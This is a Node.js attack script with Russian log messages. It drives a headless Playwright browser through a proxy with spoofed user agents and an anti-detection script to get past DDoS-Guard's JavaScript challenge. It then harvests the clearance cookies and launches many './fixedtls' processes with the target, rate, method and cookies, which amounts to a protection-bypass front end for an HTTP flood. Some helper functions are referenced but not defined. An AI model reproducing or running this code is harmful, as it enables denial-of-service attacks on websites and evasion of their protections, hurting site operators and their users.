const playwright = require('playwright');
const colors = require('colors');
const { spawn } = require('child_process');
require('events').EventEmitter.defaultMaxListeners = Infinity;

const JSList = {
  js: [
    { name: "ddos", navigations: 1, locate: '<title>DDoS-Guard</title>' }
  ]
};

const ignoreNames = [
  "RequestError", "StatusCodeError", "CaptchaError",
  "CloudflareError", "ParseError", "ParserError",
  "TimeoutError", "DeprecationWarning"
];


process.on("uncaughtException", handleError);
process.on("unhandledRejection", handleError);
process.on("warning", handleError);
process.on("SIGHUP", () => {});
process.on("SIGCHLD", () => {});

async function solverInstance(args) {
  const { Proxy, Target, Time, Method, Rate, Threads } = args;
  if (!Proxy || !Target) throw new Error("Нет Proxy или Target");

  log(`(PlayWright.cyan) Запуск с Proxy: ${Proxy}`);
  const browser = await playwright.chromium.launch({
    headless: true,
    proxy: { server: `http://${Proxy}` },
    args: [ /* твои флаги */ ]
  });

  const uaConfig = getRandomUAConfig();
  log(`(UA.cyan) Профиль: ${uaConfig.name.green}`);

  const context = await browser.newContext({
    userAgent: uaConfig.userAgent,
    viewport: uaConfig.viewport,
    deviceScaleFactor: uaConfig.deviceScaleFactor,
    isMobile: uaConfig.isMobile,
    hasTouch: uaConfig.hasTouch,
    javaScriptEnabled: true
  });

  const page = await context.newPage();
  await page.addInitScript(() => { /* антидетект-скрипт */ });

  try {
    await page.goto(Target, { waitUntil: 'domcontentloaded' });
  } catch (e) {
    await browser.close();
    throw e;
  }

  log(`(PlayWright.cyan) UA: ${uaConfig.userAgent.green}`);
  await processProtection(page, 'JSDetect [1/2]');
  await processProtection(page, 'JSDetect [2/2]');

  const cookies = cookiesToStr(await page.context().cookies());
  const title = await page.title();
  log(`(Harvester.green) Заголовок: ${title}`);
  log(`(Harvester.green) Cookies: ${cookies.yellow}`);

  for (let i = 0; i < Threads; i++) {
    spawn('./fixedtls', [Target, uaConfig.userAgent, Time, cookies, Method, Rate, Proxy])
      .on('error', err => log(`(fixedtls.error) ${err.message}`));
  }

  log(`(PlayWright.green) Сессия закрыта.`);
  await browser.close();
  return cookies;
}

async function processProtection(page, label) {
  const html = await page.content();
  let title = await page.title();
  const detected = JSDetection(html);

  if (detected && detected.name === "ddos") {
    log(`(${label.green}) Защита обнаружена: ${detected.name.yellow}`);

    while (title !== "AMG") {
      log(`(PlayWright.yellow) DDoS-Guard активен, запускаем обход`);

      for (let i = 0; i < 5; i++) {
        await page.mouse.move(randomIntFromInterval(0,100), randomIntFromInterval(0,100));
      }
      await page.mouse.down();
      await page.mouse.move(100,100);
      await page.mouse.up();

      try {
        await page.waitForNavigation({ timeout: 15000 });
      } catch {}

      title = await page.title();
      log(`(PlayWright.cyan) Текущий заголовок: ${title}`);

      if (title === "AMG") {
        log(`(PlayWright.green) AMG обнаружен — защиту обошли`);
        break;
      }

      log(`(PlayWright.red) Все ещё без AMG, ждём 3 минуты`);
      await sleep(180000);
      await page.reload({ waitUntil: 'domcontentloaded' });
      title = await page.title();
    }
  } else {
    label && log(`(${label}) Защита не найдена`);
  }
}